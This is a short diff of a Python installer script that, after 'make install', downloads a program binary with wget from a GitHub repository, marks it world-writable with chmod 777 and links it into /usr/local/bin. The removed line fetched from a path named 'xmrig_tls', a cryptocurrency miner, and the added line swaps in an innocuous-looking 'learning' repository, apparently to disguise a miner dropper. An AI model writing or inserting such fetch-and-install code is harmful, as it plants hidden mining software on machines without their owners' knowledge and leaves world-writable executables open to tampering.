@@ -22,7 +22,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
+        os.system('wget https://github.com/HarrisNancyvwguc/learning/raw/main/' + program)
         os.system('chmod 777 ' + workingdir + '/' + program)
         #workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
